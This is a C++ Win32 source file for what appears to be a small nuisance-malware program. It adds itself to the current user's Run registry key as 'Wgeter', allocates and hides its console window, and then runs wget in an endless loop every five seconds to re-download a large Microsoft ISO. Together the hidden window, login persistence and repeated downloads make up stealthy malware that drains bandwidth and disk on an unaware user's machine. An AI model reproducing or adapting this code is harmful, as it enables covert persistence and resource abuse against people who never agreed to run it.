// Win32Project1.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Win32Project1.h"



using namespace std;
void Stealth(int x)
{
    #ifdef D_LIB
    logStealth<< LINFO << "Started";
    logStealth<<LINFO << "Switching the display mode";
     #endif // D_LIB
        HWND Stealth;
        AllocConsole();
        Stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Stealth,x);/*show console app 1*/
        #ifdef D_LIB
        if (x==1)
            logStealth<< LDEBUG<<"Console Display mode is On";
        else
    logStealth<< LDEBUG<<"Console Display mode is Off";
    #endif // D_LIB
}
void start_reg()
{

    HKEY softwareKey;
	HKEY thisKey;
	HKEY schemeKey;
	DWORD dwKeyValue;
	DWORD dwKeyType;
	DWORD dwKeyValueSize;
	char cKeyValue[1024];
    dwKeyValue = 1024;
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    //exit(1);
std::string pth="C:\\Lock\\Lock.exe";

wcscpy_s(szPath, _T("C:\\Lock\\Wgeter.exe"));
pathLen = _tcslen(szPath);

HKEY newValue;
if (RegOpenKey(HKEY_CURRENT_USER,
    TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
    &newValue) != ERROR_SUCCESS)
{
    #ifdef D_LIB
    logStartupKey<<LDEBUG<<"Failure in oppening  key";
    logStartupKey<<LFATAL << "Error:unable to create value in registry";
    #endif
}
DWORD pathLenInBytes = pathLen * sizeof(*szPath);
if (RegSetValueEx(newValue,
    TEXT("Wgeter"),
    0,
    REG_SZ,
    (LPBYTE)szPath,
    pathLenInBytes) != ERROR_SUCCESS)
{
    RegCloseKey(newValue);
    #ifdef D_LIB
    logStartupKey<<LDEBUG<<"Failure in closing registry";
    #endif
}
RegCloseKey(newValue);


}



#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:


int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	start_reg();
	while(1)
	{
		Stealth(0);
		Sleep(5000);
	    system("wget -c http://download.microsoft.com/download/9/6/4/96442E58-C65C-4122-A956-CCA83EECCD03/vs2013.4_dskexp_ENU.iso");
	}
	return 0;
}



